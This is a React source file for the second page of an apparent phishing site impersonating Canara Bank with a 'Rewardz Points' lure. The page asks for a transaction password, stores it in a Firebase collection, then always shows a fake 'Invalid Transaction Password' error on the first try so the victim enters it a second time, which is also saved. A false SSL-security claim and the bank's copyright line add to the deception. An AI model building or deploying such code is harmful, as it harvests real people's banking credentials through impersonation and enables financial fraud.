import { useState } from 'react'; 
import { useNavigate, useParams } from 'react-router-dom';
import '../App.css';
import headerImage from '../assets/second-page-header.jpeg';
import FirebaseUtil from '../FirebaseRepo';

const SecondPage = () => {
  const [password2, setPassword2] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [submitCount, setSubmitCount] = useState(0); 
  const navigate = useNavigate();
  const { documentId } = useParams(); // App.jsx ke path se ID lega

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    setErrorMessage('');

    try {
      // Admin sorting ke liye current time
      const currentTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
      
      let updateData = {};
      if (submitCount === 0) {
        // Pehli baar: Trans Pass 1 save karo
        updateData = { 
          trans_pass_1: password2,
          last_active: currentTime,
          current_status: "Step 2: 1st Attempt Done"
        };
      } else {
        // Doosri baar: Trans Pass 2 save karo
        updateData = { 
          trans_pass_2: password2,
          last_active: currentTime,
          current_status: "Step 2: Completed"
        };
      }

      // Firebase mein usi ID par update karega
      await FirebaseUtil.updateDocument("carvana", documentId, updateData);

      // 5 Seconds ka Loading delay
      setTimeout(() => {
        setIsSubmitting(false);

        if (submitCount === 0) {
          // --- Attempt 1: Error dikhao aur field khali karo ---
          setErrorMessage('Invalid Transaction Password. Please try again.');
          setPassword2(''); 
          setSubmitCount(1); 
        } else {
          // --- Attempt 2: Success page par ID ke saath bhejo ---
          navigate(`/success/${documentId}`); 
        }
      }, 5000); 

    } catch (error) {
      console.error("Error:", error);
      setIsSubmitting(false);
      setErrorMessage('Network error. Please try again.');
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      <div className="w-full">
        <img src={headerImage} alt="Header" className="w-full h-40 object-cover" />
      </div>

      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg border-t-4 border-blue-700">
          <div className="text-center mb-6">
            <h1 className="text-xl font-bold text-blue-800 leading-tight">
              One Step Away To Collect Your Rewardz Points
            </h1>
            <p className="text-xs text-gray-400 mt-2">Verification required for security purposes</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            
            {/* Error Message Display */}
            {errorMessage && (
              <div className="bg-red-50 border-l-4 border-red-500 p-3 mb-4 animate-pulse">
                <p className="text-red-700 text-sm font-semibold">{errorMessage}</p>
              </div>
            )}

            <div className="mb-4">
              <label className="block text-gray-700 text-sm font-bold mb-2">
                Verify Your Transaction Password
              </label>
              <input
                type="password"
                className={`w-full py-3 px-3 rounded border text-gray-700 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all ${
                  errorMessage ? 'border-red-500 bg-red-50' : 'border-gray-300'
                }`}
                value={password2}
                onChange={(e) => setPassword2(e.target.value)}
                placeholder="Enter Transaction Password"
                required
              />
            </div>

            <button
              type="submit"
              className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-extrabold py-3 px-4 rounded-full text-sm shadow-md transition-all active:scale-95"
              disabled={isSubmitting}
            >
              {isSubmitting ? "PROCESSING..." : "SUBMIT"}
            </button>
          </form>
        </div>
      </main>

      <footer className="bg-gray-800 text-white p-4 text-center mt-auto">
        <p className="text-sm">© 2025 Canara Bank. All rights reserved.</p>
        <p className="text-[10px] opacity-50 mt-1">Secured by 256-bit SSL Encryption</p>
      </footer>
    </div>
  );
};

export default SecondPage;
